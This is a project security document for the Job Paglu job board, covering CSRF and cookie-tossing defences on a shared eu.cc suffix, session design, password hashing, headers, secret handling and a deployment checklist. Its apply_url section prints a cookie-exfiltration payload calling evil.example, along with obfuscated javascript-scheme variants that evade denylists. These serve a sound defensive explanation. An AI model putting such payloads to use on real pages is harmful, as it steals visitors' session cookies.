# Security

What Job Paglu defends against, the specific control for each threat, and where
that control lives in the codebase. It ends with an honest list of what a real
launch still needs.

Normative behaviour is in [API-CONTRACT.md](API-CONTRACT.md) — sections 5
(authentication and CSRF), 6 (error codes), 7 (`apply_url`) and 9 (field
validation). Where this document and the contract disagree, the contract wins.

**Read the next section first.** It changes how two of the controls in this
document should be read, and anyone reasoning about the security of this
deployment who skips it will reach a wrong conclusion.

---

## The `eu.cc` shared-suffix problem

The production domain is **`home.jobpaglu.eu.cc`**.

### The finding

Checked against the Public Suffix List
(`https://publicsuffix.org/list/public_suffix_list.dat`):

- **`cc` is present.**
- **`eu.cc` is absent.** The file contains exactly one `.cc` entry, `cc`.

Browsers derive "same-site" and cookie-domain scope from the *registrable
domain* — the public suffix plus one label. Since only `cc` is a public suffix,
the registrable domain of `home.jobpaglu.eu.cc` is **`eu.cc`**, not
`jobpaglu.eu.cc`.

That is not a technicality. It means every other host under `*.eu.cc` — anyone
else's free subdomain from the same provider — is treated by the browser as
**the same site as ours**, and as being able to write cookies for our
registrable domain.

### Consequence 1 — `SameSite=Lax` is not a CSRF control here

A cross-origin `POST` from `attacker.eu.cc` to `home.jobpaglu.eu.cc` is
*same-site*, so the browser attaches our session cookie. The layer that is
supposed to make hostile-form CSRF impossible does nothing on this domain.

What actually stops that request is the pair of application-level checks:

1. `X-CSRF-Token` must equal the session's token. A cross-origin page cannot
   read it.
2. `Origin` must equal `FRONTEND_URL`. `https://attacker.eu.cc` is not
   `https://home.jobpaglu.eu.cc`, so the request is refused.

Both are enforced. This is therefore not a live vulnerability — but it is only
not one because the design happened to have defence in depth. **Do not treat
`SameSite=Lax` as load-bearing on this domain, and do not weaken either of the
two checks above on the grounds that "SameSite covers it".** Nothing covers it.

### Consequence 2 — cookie tossing and session fixation

Because `eu.cc` is registrable, a browser will accept a cookie scoped
`Domain=eu.cc` set by *any* `*.eu.cc` host, and will then send it to our host
too. A neighbour can therefore set a cookie **with the same name as ours**.

The server cannot tell the two apart. A host-only cookie and a domain-scoped
cookie both arrive as a bare `name=value` pair in the `Cookie` header, and that
header may legitimately contain two entries with the same name. `Cookie(name)`
in Go — like the equivalent in most stacks — returns the first match, so the
naive read path silently picks one.

### What is implemented

| Mitigation | Where | What it does |
|---|---|---|
| **`__Host-` cookie prefix** | `backend/internal/config/config.go` → `Config.CookieName`, used by `internal/auth` | Production cookies are named `__Host-jp_session` and `__Host-jp_csrf`. A browser stores a `__Host-` cookie only if it has `Secure`, has `Path=/`, and has **no** `Domain` attribute. A neighbour on `eu.cc` therefore cannot forge or shadow one: the cookie it would have to set carries a `Domain`, and that is exactly what the prefix forbids. This is the actual fix for consequence 2 |
| **Duplicate-cookie rejection** | `auth.SessionTokenFromRequest` | The session cookie is read by iterating all cookies. Two entries with our name means the request is treated as unauthenticated. Failing closed is correct: choosing between two tokens is how a tossed cookie becomes a fixated session. With `__Host-` in place this should be unreachable, so it is also logged |
| **Single origin** | `frontend/src/pages/api/[...path].ts` | The browser only ever talks to `https://home.jobpaglu.eu.cc`. Cookies are first-party rather than same-site-by-argument, CORS never engages for admin traffic, and there is no second host whose compromise would matter |
| **`Origin` check** | `auth.CheckOrigin` | Compared against `FRONTEND_URL` on every state-changing request, `login` included. A missing `Origin` is a rejection, not a pass |
| **`X-CSRF-Token` check** | `auth.RequireCSRF` | Constant-time comparison against the session's token |

Cookie names are **derived from configuration, in one place**, precisely because
the set, clear and read paths must agree. In development (`APP_ENV=development`)
the plain `jp_session` / `jp_csrf` names are used, because the `__Host-` prefix
requires `Secure` and a `Secure` cookie is dropped over plain `http://localhost`.

### What still is not fixed, and what a real domain would fix

The `__Host-` prefix closes cookie *writing*. It does not change the fact that
the browser considers a neighbour same-site with us, so:

- `SameSite=Lax` remains inert. Any future control that relies on it — a new
  endpoint added without the `Origin` check, a third-party library's CSRF
  assumption — is wrong on this domain by default.
- Anything else that keys on the registrable domain is shared. Certificate rate
  limits are the practical example; see
  [DEPLOYMENT.md](DEPLOYMENT.md#8-custom-domain).

**The proper long-term fix is to own a real registrable domain** — a
`jobpaglu.com` — and serve the site from it. Concretely, what improves:

| With a real registrable domain | Why |
|---|---|
| `SameSite=Lax` becomes a genuine CSRF control again | No stranger can be same-site with you, so the browser-enforced layer starts doing work instead of being decorative |
| Cookie tossing stops being possible at all | Only hosts you control can set a cookie for your registrable domain, so `__Host-` becomes defence in depth rather than the only thing standing between you and a shadowed cookie |
| Certificate rate limits become yours alone | Issuance no longer competes with every other user of the suffix |
| A sibling-subdomain API host (`api.jobpaglu.com`) becomes a reasonable option again | It would be genuinely same-site, so the proxy could be removed if the extra hop ever mattered |
| One less thing to explain in every future security review | The current situation needs a paragraph. "We own our domain" needs none |

Until then, this section is the answer to "why is CSRF enforced three times and
why do the cookies have odd names".

---

## What the hosting choice costs, and what it buys

The deployment moved from Cloudflare Pages + Google Cloud Run to **Vercel**
(two projects) + Neon on 2026-08-22 — [DECISIONS.md D-20](DECISIONS.md#d-20--vercel-for-both-the-frontend-and-the-backend).
Every control in this document still exists and none was weakened to make the
deployment easier. Three of them are nevertheless **weaker in effect**, and one
whole class of risk disappeared. Both directions are recorded here because a
reader deciding whether to trust this deployment needs both.

### Weaker on the new stack

| Control | What changed | Where the detail is |
|---|---|---|
| **Login rate limiting** | The limiter is in-process. On Cloud Run the instance count was capped at 4, so the effective limit was at most 4x the configured one — a known, bounded number. On a serverless platform the instance count is not something this application sets, so the multiplier is **unknown**, not merely larger. This is a real limitation of the hosting choice, not an implementation detail | [Section 6](#6-login-hardening) |
| **Connection exhaustion** | `--max-instances 4` was simultaneously a spend guard and a *database* guard. There is no equivalent flag. The mitigations are a much smaller per-instance pool (`DB_MAX_CONNS`, default 2) and Neon's pooled endpoint, which is now **mandatory** rather than merely advisable | [Section 1](#1-threat-model), `internal/database.Open` |
| **Secret storage** | Cloud Run mounted `DATABASE_URL` and `ADMIN_SESSION_SECRET` *by reference* from Google Secret Manager, so the value was resolved at container start and was never in revision metadata. Vercel stores environment variables encrypted and injects them into the build and runtime environment. That is a normal and reasonable design, but it is **not** a secret manager with references, and a project member with the right role can read a value back | [Section 8](#8-secret-handling) |

None of these is a live vulnerability. Each is a place where the honest answer to
"how strong is this?" got shorter. If any of them stops being acceptable, the
fixes are, in order of effort: a shared rate-limit store (Redis or a Postgres
table), an edge rate-limit rule, and a return to a container host — which the
retained `backend/Dockerfile` deliberately keeps available.

### Stronger on the new stack

| Control | What changed |
|---|---|
| **No deploy credential exists** | Vercel's Git integration deploys on push. There is no API token to create, store, rotate, paste, or leak. **Two API tokens have already been disclosed into a chat transcript during this project.** A mechanism that requires no credential cannot repeat that failure. This is the single largest security improvement in the change, and it is a structural one rather than a procedural one |
| **The frontend now sends security headers** | It previously sent **none**: there was no `_headers` file, no `<meta http-equiv>`, and nothing in any layout. `frontend/vercel.json` now sets CSP, HSTS, `nosniff`, `Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy` and `Cross-Origin-Opener-Policy` on page responses, scoped with a negative-lookahead source so they never duplicate or override the API's own |
| **One fewer moving part in the credential path** | `/api/*` is a routing-layer rewrite rather than an application proxy, so no function code touches a `Set-Cookie` header on the way through. The Astro proxy route remains as an inert, reviewable fallback |

Unchanged, and deliberately so: the single origin, the `__Host-` cookie prefix,
the duplicate-cookie rejection, the `Origin` check, the `X-CSRF-Token` check,
Argon2id, the `apply_url` allowlist on write and on render, and the visibility
predicate living in SQL.

---

## 1. Threat model

| Threat | Control | Where the control lives |
|---|---|---|
| SQL injection | Parameterised `$n` queries only. No string-concatenated SQL anywhere, including in the search path | The repository layer, `backend/internal/jobs` and `backend/internal/auth`. It is the *only* layer permitted to contain SQL — see [ARCHITECTURE.md](ARCHITECTURE.md#4-backend-layering) |
| Stored XSS in job content | Astro escapes interpolated values by default. `description` is plain text with newlines and is rendered as text, never with `set:html`. A strict CSP with no `unsafe-inline` for scripts | The Astro templates under `frontend/src/pages` and `frontend/src/components`; CSP for API responses in `backend/internal/middleware`; CSP for **page** responses in `frontend/vercel.json` (see [section 7](#7-transport-and-headers) — the frontend previously sent no headers at all) |
| **`javascript:` apply URL** | Allowlist validation on write **and** a scheme re-check on render. Fails closed to a disabled button | `backend/internal/validation` on write; the `ApplyButton` component on render. See [section 2](#2-the-apply_url-allowlist) |
| CSRF | Three layers, of which **only two are load-bearing on this domain**: `X-CSRF-Token` compared to the session's token in constant time, and an `Origin` check against `FRONTEND_URL`. The `SameSite=Lax` cookie is the third and is inert on a shared registrable suffix | The CSRF middleware in `backend/internal/middleware`; token issued by `backend/internal/auth`. See [section 4](#4-csrf) and [the `eu.cc` section](#the-eucc-shared-suffix-problem) |
| **Cookie tossing / shadowing from a neighbouring host** | `__Host-` cookie-name prefix in production, plus rejection of any request carrying two cookies with the session name | `backend/internal/config` (`Config.CookieName`) and `backend/internal/auth` (`SessionTokenFromRequest`). See [the `eu.cc` section](#the-eucc-shared-suffix-problem) |
| Session theft via script | `HttpOnly` on the session cookie, so no script can read it even if an XSS bug exists | Cookie attributes set in `backend/internal/auth` |
| Session theft via a database dump | Only `sha256(token)` is stored. The plaintext token exists in the response and the browser's cookie jar, nowhere else | `backend/internal/auth`, and the `sessions` table |
| Session fixation | The session token is rotated on every successful login | The login handler in `backend/internal/auth` |
| Stale or forgotten sessions | Idle expiry 12h and absolute expiry 7 days, both enforced server-side on every request | The session middleware |
| Credential stuffing / brute force | Argon2id (deliberately slow and memory-hard), constant-time comparison, per-IP and per-account rate limits, uniform error and comparable timing | `backend/internal/auth` for hashing; the rate-limit middleware. See [sections 5 and 6](#5-password-storage) |
| User enumeration | `401 INVALID_CREDENTIALS` with the identical message and a comparable response time for an unknown email and a wrong password | The login handler |
| Broken access control | Every `/api/admin/*` route passes through the session middleware, and the public repository query cannot return a draft because the visibility predicate is in the SQL rather than applied by a handler | The middleware chain; the repository layer |
| Privilege escalation through the API | There is no self-service registration and no role-changing endpoint. Admin accounts exist only via `backend/cmd/adminctl`, which has no HTTP surface at all | The absence of a route is the control |
| Clickjacking | `frame-ancestors 'none'` in the CSP, plus `X-Frame-Options: DENY` for older agents | Security-headers middleware |
| MIME sniffing | `X-Content-Type-Options: nosniff` | Security-headers middleware |
| Referrer leakage | `Referrer-Policy: strict-origin-when-cross-origin`, and `rel="noreferrer"` on outbound apply links | Security-headers middleware; `ApplyButton` |
| Reverse tabnabbing on Apply | `rel="noopener"` alongside `target="_blank"`, so the opened employer page cannot reach back into `window.opener` | `ApplyButton` |
| Downgrade to plaintext | HTTPS everywhere, HSTS, `Secure` on both cookies, `sslmode=require` to Postgres | Vercel terminates TLS on both projects and does not serve plaintext; HSTS from `frontend/vercel.json` on pages and from the middleware on API responses; the connection string |
| Cross-origin credential theft | CORS echoes exactly one configured origin with `Allow-Credentials: true`. `*` is never combined with credentials | CORS middleware, driven by `FRONTEND_URL` |
| Resource exhaustion by request size | Request bodies capped at 64 KiB; over that is `413 PAYLOAD_TOO_LARGE` | `backend/internal/httpx` |
| Resource exhaustion by connections | A deliberately tiny per-instance pgx pool (`DB_MAX_CONNS`, default **2**) plus Neon's **pooled** endpoint. There is no instance cap on serverless, so the pooler is what absorbs the fan-out — see the note above | `backend/internal/database`; [DEPLOYMENT.md](DEPLOYMENT.md#32-two-connection-strings-and-which-goes-where) |
| Information leak in errors | Structured errors from a closed code set. `INTERNAL_ERROR` returns a generic message and a request ID. Stack traces go to the log, never to a response | `backend/internal/httpx`; the recover middleware |
| Secret leak into the repository | `.env` is git-ignored, `.env.example` holds placeholders only, no secret is ever logged, CI runs a secret scan | `.gitignore`, `.env.example`, `.github/workflows/ci.yml`. See [section 8](#8-secret-handling) |
| Malicious or malformed input generally | Every field trimmed, control characters stripped, length-bounded, and enum members checked against a closed set before anything reaches the database | `backend/internal/validation`, contract section 9 |

---

## 2. The `apply_url` allowlist

This is the one field where a bad value becomes an attack on a visitor rather
than on the server, so it gets the strictest treatment in the codebase.

A value is accepted only if **all** of the following hold (contract section 7):

1. It parses as an absolute URL.
2. The scheme is `https`. `http` is accepted **only** when the backend runs with
   `ALLOW_HTTP_APPLY_URLS=true`, which defaults to `false`.
3. The scheme is not `javascript`, `data`, `vbscript`, `file`, `blob`, `about`,
   `mailto`, `tel`, or anything else. **The check is an allowlist, not a
   denylist.**
4. There is a non-empty host containing a `.` — or `localhost`, in development
   only.
5. There is no userinfo component. `https://user:pass@host` is rejected.
6. The length is at most 2048 characters.
7. There are no ASCII control characters, no whitespace, and no raw newline.

The stored value is returned **byte-for-byte**. It is never rewritten, proxied,
shortened or decorated with tracking parameters. That is a product requirement,
and it is also a security property: a value that is never transformed cannot be
transformed into something dangerous.

### Why an allowlist and not a denylist

A denylist has to enumerate every dangerous scheme, and it will be wrong. It has
to survive `JaVaScRiPt:`, `java\tscript:`, `%6a%61vascript:`, and whatever the
next parser quirk turns out to be. An allowlist has to recognise one string:
`https`. Anything it fails to recognise is rejected, which is the correct
default when the input comes from outside and the output becomes a link a
stranger clicks.

### Why it is checked twice

Validation on write is not sufficient, because **the database is not only
written through the API**. A row can be changed by:

- a `psql` session during an incident,
- a data-fix script,
- a restore from a backup taken before the validation existed,
- a future bulk import that forgets to call the validator,
- an SQL injection bug somewhere else in the system.

None of those paths goes through `internal/validation`. So `ApplyButton`
re-checks the scheme at render time and, if it fails, renders a **disabled
state instead of a link**. It fails closed. A row edited directly in the
database to `javascript:fetch('https://evil.example/'+document.cookie)` becomes
a greyed-out button on a job page, not a live payload in every visitor's
browser.

This is the only deliberately duplicated logic in the codebase. The
[CONTRIBUTING.md](CONTRIBUTING.md) rule against copy-pasted logic does not apply
to it, and the duplication is intentional rather than an oversight — write a
comment saying so if you ever touch either side.

---

## 3. Session design

```
# production
__Host-jp_session=<43-char base64url token>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=43200

# development (APP_ENV=development) — no Secure, so no __Host- prefix
jp_session=<43-char base64url token>; HttpOnly; SameSite=Lax; Path=/; Max-Age=43200
```

| Property | Value | Why |
|---|---|---|
| Token entropy | **32 cryptographically random bytes**, base64url-encoded without padding (43 characters) | 256 bits. Guessing is not a threat model, it is arithmetic that does not work |
| Stored form | **`sha256(token)` only** | A database dump, a leaked backup, or read access to the `sessions` table yields no usable session. There is nothing to reverse |
| Lookup | The server hashes the presented cookie and looks up the hash | The plaintext token exists in exactly two places: the response that created it, and the browser's cookie jar |
| Rotation | A new token is issued on **every** successful login, and the old session row is replaced | Defeats session fixation: an attacker who plants a known session identifier before login finds it worthless after |
| Idle expiry | **12 hours** since last use, enforced server-side | An abandoned open tab stops being a valid credential |
| Absolute expiry | **7 days** since creation, enforced server-side | A session that is kept alive by activity still ends. No session is immortal |
| `Max-Age` | 43200 (12h) | A convenience for the browser so it discards a dead cookie. **Never the authority** — a client that ignores it, or edits it, gains nothing, because both expiries are checked in the database on every request |
| Revocation | Delete the row | Immediate and total. This is the single biggest practical advantage over a JWT, and the reason for [D-19](DECISIONS.md#d-19--sessions-in-postgres-rather-than-a-jwt) |
| `Secure` | Always, except when `APP_ENV=development` | `http://localhost` works in development without weakening production by a single attribute |
| Name | **`__Host-` prefixed whenever `Secure` is set** | No other host — including one on the shared `eu.cc` registrable domain — can write or shadow a cookie under this name, because a browser refuses a `__Host-` cookie that carries a `Domain`. The prefix requires `Secure`, `Path=/` and no `Domain`, so the name and the attributes are derived from one decision in `Config.CookieName` rather than set independently |
| Reading it | Iterate all cookies; **two matches means unauthenticated** | The `Cookie` header can carry the same name twice and the server cannot tell which is ours. Picking one is a guess, and a wrong guess is a fixated session |

`ADMIN_SESSION_SECRET` is a server-side secret used in session handling. Rotating
it invalidates every existing session, which is exactly the response you want
after a suspected compromise: change one value, redeploy, everyone is signed
out.

Logout deletes the server-side row and sends expired cookies. It is idempotent —
calling it without a session is still `204` — so a client can always reach a
known signed-out state.

---

## 4. CSRF

Three controls, all required on every state-changing admin request — but on the
current domain only layers 2 and 3 actually do anything. See
[the `eu.cc` section](#the-eucc-shared-suffix-problem).

| Layer | Mechanism | What it stops on its own | Where it fails on its own |
|---|---|---|---|
| 1 | `SameSite=Lax` on the session cookie | In principle: the browser refuses to attach the cookie to a cross-site request, so classic hostile-form and hostile-image attacks never carry credentials | **On `home.jobpaglu.eu.cc`, everything.** The registrable domain is `eu.cc`, so any stranger's `*.eu.cc` host is same-site and the cookie *is* sent on its cross-origin POSTs. Even on a properly owned domain it fails against a same-site attacker — a taken-over subdomain, or one hosting user content — and `Lax` has documented per-browser variation in edge cases (top-level navigations, legacy grace periods for freshly set cookies) |
| 2 | `X-CSRF-Token` compared to the session's token in constant time | A cross-site request cannot set a custom header without a successful CORS preflight, and the preflight is refused for any origin that is not `FRONTEND_URL`. Also stops a same-site attacker who has the cookie but not the token | A same-site XSS on an origin that can read `jp_csrf`. The token is deliberately readable by script — that is how the client echoes it — so script execution in the right place defeats this layer |
| 3 | `Origin` (falling back to `Referer`) must equal `FRONTEND_URL`; a **missing** `Origin` on a state-changing request is rejected | Anything sent from another origin, including a request that somehow carried both cookie and token. Rejecting a missing `Origin` closes the "strip the header and see what happens" trick | Nothing much on its own; it depends on the browser sending an honest `Origin`, which browsers do. It is a cheap check with no failure mode of its own |

Why all three rather than the best one: each covers the case where another is
weakest. `SameSite` is a browser-enforced control with browser-dependent edge
cases; the token is application-enforced and cannot be bypassed by a quirk in
someone's cookie implementation; the `Origin` check is nearly free and catches
requests that reach the handler with a valid cookie for reasons nobody
anticipated. Removing any one of them makes a specific, nameable attack
possible again, and none of the three costs a measurable amount of anything.

On this domain that argument is doing real work rather than being a platitude:
layer 1 is inert, so layers 2 and 3 are not redundancy, they are the control.
Anyone editing `RequireCSRF`, `CheckOrigin`, or the login handler's `Origin`
check should read it as load-bearing code.

The CSRF token is delivered in the login response body **and** as a readable
cookie (`__Host-jp_csrf` in production, `jp_csrf` in development), so a client
that reloads can recover it from `GET /api/admin/me` without a fresh login.
Mismatch or absence is `403 CSRF_INVALID`.

`POST /api/admin/login` is exempt from the token check, because there is no
session to have a token for yet. It is protected by the rate limiter and the
`Origin` check instead.

---

## 5. Password storage

**Argon2id**, from `golang.org/x/crypto/argon2`, with these parameters:

| Parameter | Value |
|---|---|
| Memory | 64 MiB |
| Time (iterations) | 3 |
| Parallelism | 2 |
| Key length | 32 bytes |
| Salt length | 16 bytes, unique per password, from a CSPRNG |
| Encoding | PHC string format |

Argon2id is the current OWASP first choice for password storage and is
memory-hard, which is what makes GPU and ASIC cracking expensive rather than
merely inconvenient. bcrypt would have been acceptable and is battle-tested over
a longer period; Argon2id is better and is equally available in the Go
ecosystem. See [D-9](DECISIONS.md#d-9--argon2id-for-password-hashing).

### Why PHC encoding matters

The stored hash looks like this in shape:

```
$argon2id$v=19$m=65536,t=3,p=2$<base64 salt>$<base64 hash>
```

The parameters travel **with the hash**. That has one important consequence:
parameters can be upgraded without invalidating anybody's password. Verification
reads `m`, `t` and `p` out of the stored string and uses those values, so an old
hash still verifies correctly after the defaults change. The upgrade path is:

1. Raise the defaults in the hashing code.
2. On the next successful login, notice that the stored parameters are below the
   current defaults and re-hash the password — which you have in hand at that
   moment, and only at that moment.
3. Write the new hash.

Without PHC encoding this requires a parameter column, a migration, and a
version check written by hand. With it, the format does the work.

`ADMIN_BOOTSTRAP_PASSWORD` is read once by `cmd/adminctl`, hashed, and
discarded. It is never stored, never logged, and never set on the running
service. Passwords are never passed as command-line flags — flags are visible in
`ps` to every user on the machine, land in shell history, and are captured by CI
logs.

---

## 6. Login hardening

| Control | Detail |
|---|---|
| Uniform error | An unknown email and a wrong password both return `401 INVALID_CREDENTIALS` with the identical `message`. A client cannot distinguish them, so the login form cannot be used to enumerate which addresses have accounts |
| Comparable timing | The expensive part of a login is the Argon2id verification. If an unknown email returned immediately, the response-time difference would leak exactly what the uniform message hides — a timing oracle is still an oracle. The handler therefore performs comparable work on the unknown-email path (verifying against a dummy hash with the same parameters) so the two paths take a similar time |
| Constant-time comparison | Hash and token comparisons use a constant-time function, never `==` on a byte slice |
| Per-IP rate limit | **5 failed attempts from one IP within 15 minutes** then `429 RATE_LIMITED` with `Retry-After` |
| Per-account rate limit | **10 failed attempts against one email within 15 minutes** then `429`. This is the control that matters when the attacker has many IPs and one target |
| Counter reset | A successful login clears the counters, so a legitimate user who mistyped twice is not locked out by their own success |

The rate limiter is **in-process**. Consequences, stated rather than glossed
over:

- A deploy resets an attacker's budget, because a deploy replaces every instance.
- Each instance keeps its own counters, so the effective limit is the configured
  limit **multiplied by the number of live instances**. On the current
  serverless host that count is not something this application sets, which makes
  the multiplier **unknown rather than merely large** — there is no
  `--max-instances` equivalent to bound it. Say this plainly: on Vercel, "5
  failed attempts per IP per 15 minutes" is a per-instance statement and not a
  system-wide one. It is a real limitation of the hosting choice
  ([D-20](DECISIONS.md#d-20--vercel-for-both-the-frontend-and-the-backend)), and
  the previous stack was genuinely better here.
- What still bites regardless of instance count: the per-account limit applies to
  one email on whichever instance handles the attempt, and Argon2id at 64 MiB
  makes every single attempt expensive in CPU and memory. An attacker gets more
  attempts than the configured number; they do not get cheap ones.
- **The honest fix is a shared store** — Redis, or a `login_attempts` table in
  the Postgres this application already depends on. The latter needs no new
  service and is the obvious first move: sessions are already in Postgres, so the
  round trip is one the login path is paying anyway. Doing it in the database
  makes the limit a true system-wide limit rather than a per-instance one.
- Until then, the available mitigations that do not require code are an
  edge/WAF rate-limit rule in front of the site, and a strong unique admin
  password. Neither is configured; see [Not yet done](#not-yet-done).
- Restarting an instance clears its counters. In development that is convenient
  ([TROUBLESHOOTING.md](TROUBLESHOOTING.md) uses it as the fix for a `429` you
  gave yourself). On serverless, instances are created and discarded constantly,
  so treat counter loss as normal rather than exceptional.

---

## 7. Transport and headers

| Header | Value | Purpose |
|---|---|---|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | After the first visit the browser refuses plaintext, so an attacker cannot strip TLS on a later request |
| `Content-Security-Policy` | strict; **no `unsafe-inline` for `script-src`**; `frame-ancestors 'none'`; `object-src 'none'`; `base-uri 'self'` | Turns most XSS from "runs" into "blocked and reported". `frame-ancestors 'none'` is the clickjacking control. `base-uri 'self'` stops an injected `<base>` from redirecting every relative URL on the page |
| `X-Content-Type-Options` | `nosniff` | A response is treated as its declared type, so a text response cannot be coaxed into executing |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | An outbound apply click does not disclose the full internal path a visitor came from |
| `X-Frame-Options` | `DENY` | Redundant with `frame-ancestors` for modern browsers; harmless and useful for old ones |
| `Cache-Control` on `/api/admin/*` | `no-store` | Per-session data is never written to any cache, shared or private |

**Where each header comes from.** API responses get theirs from the Go
security-headers middleware. **Page** responses get theirs from the `headers`
block in `frontend/vercel.json` — which is new, because before this the frontend
sent no security headers at all. That block is scoped `"source": "/((?!api/).*)"`
so it applies to pages only and cannot duplicate or contradict what the API
already sends on the same origin.

> **Unverified, and a reviewer must check it.** The page CSP is
> `script-src 'self'` with no nonce and no hash. `SeoHead.astro` emits the
> `JobPosting` structured data as an inline `<script type="application/ld+json"
> is:inline>`. A non-executable script type is not subject to `script-src` per
> the CSP specification, and modern browsers behave that way — but this has not
> been tested against a real browser, and the JSON-LD block is acceptance
> criterion T-14. Step 10 of the acceptance test in
> [DEPLOYMENT.md](DEPLOYMENT.md#12-end-to-end-acceptance-test) is what confirms
> it. If a browser does object, the fix is a hash or a nonce for that one block
> — **never** `unsafe-inline`, which switches the protection off for the whole
> document.

The frontend's CSP has to accommodate Astro's inline styles, so `style-src`
permits inline while `script-src` does not. That asymmetry is deliberate: an
injected `<style>` is a defacement risk, an injected `<script>` is a takeover.
If the CSP ever has to be loosened for scripts, use a nonce or a hash — never
`unsafe-inline`, which switches the protection off for the whole document.

Database transport: `sslmode=require` in every connection string, in every
environment except a local Docker Postgres on the loopback interface.

---

## 8. Secret handling

### Never committed, under any circumstance

- Database credentials or connection strings containing a password
  (`DATABASE_URL`)
- `ADMIN_SESSION_SECRET`
- Admin passwords, including `ADMIN_BOOTSTRAP_PASSWORD`
- Cloud provider credentials: Vercel access tokens, service-account JSON keys,
  any CLI credential file
- Any third-party API key added later
- Private keys, certificates, `.pem`, `.key`, `.p12` files
- Database dumps, `.sql` backups containing real rows, or any file with a real
  session token or password hash in it

### The rules

| Rule | Detail |
|---|---|
| `.env` is git-ignored | Verify with `git check-ignore -v .env`, which reports the matching rule. Reading `.gitignore` and assuming is not verification |
| `.env.example` holds placeholders only | Every variable by name, every value obviously fake: `postgres://USER:PASSWORD@HOST/DB`, `changeme-generate-a-32-byte-random-string`. A plausible-looking fake value is worse than an obvious one, because someone will eventually deploy it |
| No secret is ever logged | The request logger records method, path, status, duration and request ID. Never a request body, never a header, never a cookie, never a connection string. A `DATABASE_URL` printed once at startup is a credential in your log retention for as long as that retention lasts |
| Production secrets live in the platform's encrypted environment store | Vercel Project → Settings → Environment Variables, per project and per environment. Never in a tracked file, never in a build log. **Be precise about what this is:** Vercel encrypts the values at rest and injects them at build and run time. It is not a secret manager with references, so unlike Cloud Run's `--set-secrets` there is no arrangement where the deployment holds only a pointer — a project member with the right role can read a value back. That is a downgrade from the previous stack and is recorded as such above |
| No deploy credential exists at all | Vercel's Git integration deploys on push, so there is no API token in Actions secrets, on a laptop, or in a shell history. If you use the manual-dispatch fallback workflow instead, `VERCEL_TOKEN` is a real credential: scope it, expire it, and delete it the day you switch |
| Secrets never enter documentation | This repository names credentials and never prints them. Every example value in every document here is a placeholder |
| Rotation | `ADMIN_SESSION_SECRET` on suspicion, and on a schedule. `DATABASE_URL` via Neon role rotation. Admin passwords via `adminctl` |

### If a secret is exposed

Do not quietly clean it up. In order:

1. **Stop** and treat it as disclosed, even if the exposure looks internal. A
   value in a build log, a screenshot, a chat message or a git object is
   disclosed.
2. Revoke or rotate it at the source: Neon role password, a new
   `ADMIN_SESSION_SECRET` (which signs everyone out), a new admin password.
3. Redeploy so nothing is still using the old value.
4. Remove it from wherever it leaked. Note that a rewritten git history does not
   un-disclose anything — the value must be rotated regardless, because it may
   already have been fetched.
5. Write down what happened and what changed, so the next person does not
   rediscover the same hole.

The order matters: rotate first, tidy second. A repository cleaned before the
credential is rotated is a repository that looks safe and is not.

---

## Pre-deployment security checklist

Complete this before the first production deploy, and re-check the starred items
after any change to auth, cookies, CORS or hosting.

**Secrets**

- [ ] `git check-ignore -v .env` confirms `.env` is ignored
- [ ] `git status` shows no `.env`, no `*.pem`, no `*.key`, no service-account JSON
- [ ] The full diff contains no credential — read it, do not skim it
- [ ] `.env.example` contains placeholders only, and no value from it would work anywhere
- [ ] `ADMIN_SESSION_SECRET` is at least 32 random bytes, generated not typed, and unique to this environment
- [ ] `DATABASE_URL` and `ADMIN_SESSION_SECRET` are set only in the API project's encrypted environment variables — never in a tracked file, never echoed
- [ ] `DATABASE_URL` on the API project is the **pooled** Neon string; the **direct** one exists only as the migrate workflow's secret
- [ ] `DB_MAX_CONNS` is set, and you know that the number Postgres sees is this times the live instance count
- [ ] No `VERCEL_TOKEN` exists, because deploys use the Git integration. If one does exist, you know why, and it is scoped and expiring
- [ ] No secret appears in any CI log, build log or deploy output

**Authentication**

- [ ] The first admin password was supplied by prompt or `ADMIN_BOOTSTRAP_PASSWORD`, never a command-line flag
- [ ] The admin password is long and unique to this system
- [ ] Login with a wrong password and with an unknown email produce the identical response body
- [ ] Six rapid failed logins produce `429` with a `Retry-After` header
- [ ] * A second admin request after login succeeds — this is the same-site cookie check, and only the *second* request proves it

**Cookies and CSRF**

- [ ] * The session cookie is named **`__Host-jp_session`** in production — if it is `jp_session`, `APP_ENV` is not `production`
- [ ] * `__Host-jp_session` has `HttpOnly`, `Secure`, `SameSite=Lax`, `Path=/`, and **no `Domain`**
- [ ] `__Host-jp_csrf` has `Secure`, `SameSite=Lax`, `Path=/`, no `Domain`, and is deliberately **not** `HttpOnly`
- [ ] A mutation without `X-CSRF-Token` returns `403 CSRF_INVALID`
- [ ] A mutation with a wrong `Origin` returns `403 CSRF_INVALID`
- [ ] * A request carrying two cookies named `__Host-jp_session` returns `401` — this is the cookie-tossing guard, and it is the one control on this domain that has no browser-side backstop

**Access control**

- [ ] Every `/api/admin/*` route returns `401` with no session — test each one, not a sample
- [ ] A `draft` job's public detail URL returns `404`
- [ ] An `unpublished` job's public detail URL returns `404`
- [ ] A soft-deleted job returns `404` and is absent from the public list
- [ ] An expired job (`expires_at` in the past) returns `404`

**Transport and headers**

- [ ] Production is HTTPS only; `http://` redirects
- [ ] HSTS present
- [ ] CSP present, and `script-src` has no `unsafe-inline`
- [ ] `frame-ancestors 'none'` and `X-Frame-Options: DENY` present
- [ ] `X-Content-Type-Options: nosniff` present
- [ ] `nosniff`, CSP and HSTS verified on an **admin** response as well as a public one
- [ ] Headers verified on a **page** response too — those come from `frontend/vercel.json`, not from the Go middleware, and are new
- [ ] The `JobPosting` JSON-LD block still renders under the new page CSP (see [section 7](#7-transport-and-headers))
- [ ] * CORS echoes exactly one origin and never `*` on a credentialed response — in the single-origin topology this is verified by *not* seeing a preflight at all on an admin mutation
- [ ] `DATABASE_URL` contains `sslmode=require`

**Input and output**

- [ ] `apply_url` rejects `javascript:`, `data:`, `file:`, a scheme-less value, and `https://user:pass@host`
- [ ] A stored bad `apply_url` renders as a disabled button rather than a link
- [ ] Apply links carry `rel="noopener noreferrer nofollow"`
- [ ] A body over 64 KiB returns `413`
- [ ] A `500` response body contains a generic message and a request ID, and no stack trace or file path

**Operational**

- [ ] `/health` returns `200` without touching the database; `/ready` returns `503` when the database is unreachable
- [ ] `RUN_MIGRATIONS_ON_START` is set deliberately, and you know which way and why
- [ ] `ALLOW_HTTP_APPLY_URLS=false` in production
- [ ] `APP_ENV=production` — this is what keeps `Secure` on the cookies
